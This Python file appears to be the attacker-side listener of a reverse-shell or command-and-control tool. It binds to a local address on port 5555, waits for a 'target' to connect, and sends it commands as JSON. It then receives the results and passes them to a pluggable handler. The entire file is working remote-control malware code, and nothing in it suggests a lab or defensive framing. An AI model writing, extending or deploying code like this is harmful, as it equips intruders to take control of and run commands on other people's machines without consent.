import json
import socket

handlerfunction = None

def attachHandler(funcName):
    global handlerfunction
    handlerfunction = funcName

def send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def recieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication(command):
    send(command)
    result = recieve()
    handlerfunction(result)


def establish_communication():
    global target
    global ip
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("192.168.1.11", 5555))
    print("Listening for incoming connections")
    sock.listen(5)
    target, ip = sock.accept()
    print("[+] Target connected from: ", str(ip))


